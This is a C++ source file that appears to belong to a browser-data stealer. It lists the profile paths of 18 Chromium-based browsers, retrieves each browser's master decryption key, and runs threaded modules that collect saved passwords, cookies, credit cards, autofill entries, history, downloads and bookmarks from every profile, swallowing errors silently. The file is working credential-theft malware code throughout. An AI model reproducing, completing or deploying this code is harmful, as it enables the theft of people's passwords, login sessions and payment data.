//
// Created by .1qxz on 08.06.2024.
//

#include "ChromiumBrowsers.h"
#include "impl/CHistory.h"
#include "impl/CCreditCards.h"
#include "impl/CDownloads.h"
#include "impl/CPasswords.h"
#include "impl/CBookmarks.h"
#include "impl/CAutoFill.h"
#include "impl/CCookies.h"

static const std::vector<std::pair<std::pair<std::string, bool>, fs::path>> CHROMIUM_BROWSERS = {
    {{"Opera", false},      Utils::getRoamingPath() / "Opera Software"       / "Opera Stable"               },
    {{"Opera GX", false},   Utils::getRoamingPath() / "Opera Software"       / "Opera GX Stable"            },
    {{"Amigo",true},        Utils::getLocalPath()   / "Amigo"                / "User Data"                  },
    {{"Torch",true},        Utils::getLocalPath()   / "Torch"                / "User Data"                  },
    {{"Kometa",true},       Utils::getLocalPath()   / "Kometa"               / "User Data"                  },
    {{"Orbitum",true},      Utils::getLocalPath()   / "Orbitum"              / "User Data"                  },
    {{"Epic Private",true}, Utils::getLocalPath()   / "Epic Privacy Browser" / "User Data"                  },
    {{"Cent",true},         Utils::getLocalPath()   / "CentBrowser"          / "User Data"                  },
    {{"Vivaldi",true},      Utils::getLocalPath()   / "Vivaldi"              / "User Data"                  },
    {{"Irdium",true},       Utils::getLocalPath()   / "Iridium"              / "User Data"                  },
    {{"7Star",true},        Utils::getLocalPath()   / "7Star"                / "7Star"         / "User Data"},
    {{"Sputnik",true},      Utils::getLocalPath()   / "Sputnik"              / "Sputnik"       / "User Data"},
    {{"Chrome SxS",true},   Utils::getLocalPath()   / "Google"               / "Chrome SxS"    / "User Data"},
    {{"Chrome",true},       Utils::getLocalPath()   / "Google"               / "Chrome"        / "User Data"},
    {{"Edge",true},         Utils::getLocalPath()   / "Microsoft"            / "Edge"          / "User Data"},
    {{"Uran",true},         Utils::getLocalPath()   / "uCozMedia"            / "Uran"          / "User Data"},
    {{"Yandex",true},       Utils::getLocalPath()   / "Yandex"               / "YandexBrowser" / "User Data"},
    {{"Brave",true},        Utils::getLocalPath()   / "BraveSoftware"        / "Brave-Browser" / "User Data"},
};

ChromiumBrowsers::ChromiumBrowsers() {
    this->modules.push_back(new CHistory());
    this->modules.push_back(new CCreditCards());
    this->modules.push_back(new CDownloads());
    this->modules.push_back(new CPasswords());
    this->modules.push_back(new CBookmarks());
    this->modules.push_back(new CCookies());
    this->modules.push_back(new CAutoFill());
}

void ChromiumBrowsers::execute(fs::path &root) {
    std::vector<std::thread> threads;

    for(const auto &browser : CHROMIUM_BROWSERS)
    {
        if(!exists(browser.second))
            continue;

        threads.emplace_back([browser, &root, this]() {
            std::vector<std::thread> moduleThreads;

            fs::path browserRoot = root / "Browsers" / browser.first.first;

            std::vector<BYTE> master_key = ChromiumUtil::getMasterKey(browser.second);

            if(master_key.empty())
                return;

            std::vector<std::string> profiles = ChromiumBrowsers::findProfiles(browser.second);

            for(ChromiumBrowserModule* module : this->modules)
            {
                module->setMasterKey(master_key);
                module->setHasProfiles(browser.first.second);

                if(browser.first.second)
                {
                    moduleThreads.emplace_back([module, &browser, &browserRoot, &profiles]() {
                        for(std::string &profile : profiles) {
                            try {
                                module->setProfile(profile);
                                module->execute(browserRoot, browser.first.first, browser.second);
                            } catch (const std::exception& e) {
                                #if DEV
                                    std::cerr << "DEBUG ERROR: " << e.what() << std::endl;
                                #endif
                            } catch (...){}
                        }
                    });
                }
                else
                {
                    moduleThreads.emplace_back([module, &browser, &browserRoot, &profiles]() {
                        try{
                            module->execute(browserRoot, browser.first.first, browser.second);
                        } catch (const std::exception& e){
                            #if DEV
                            std::cerr << "DEBUG ERROR: " << e.what() << std::endl;
                            #endif
                        } catch (...){}
                    });
                }
            }

            for(auto& thread : moduleThreads) {
                if (thread.joinable()) {
                    thread.join();
                }
            }
        });
    }

    for(auto& thread : threads) {
        if (thread.joinable()) {
            thread.join();
        }
    }
}

std::vector<std::string> ChromiumBrowsers::findProfiles(const fs::path &path) {
    std::vector<std::string> profiles;

    for (const auto& entry : fs::directory_iterator(path)) {
        if (fs::is_directory(entry.path())) {
            bool found = false;
            for (const auto& sub_entry : fs::directory_iterator(entry.path())) {
                std::string filename = sub_entry.path().filename().string();

                if (StringUtil::endswith(filename, "Profile.ico") ||
                    StringUtil::endswith(filename, "LOG")) {
                    found = true;
                    break;
                }
            }
            if (found) {
                profiles.push_back(entry.path().filename().string());
            }
        }
    }

    return profiles;
}
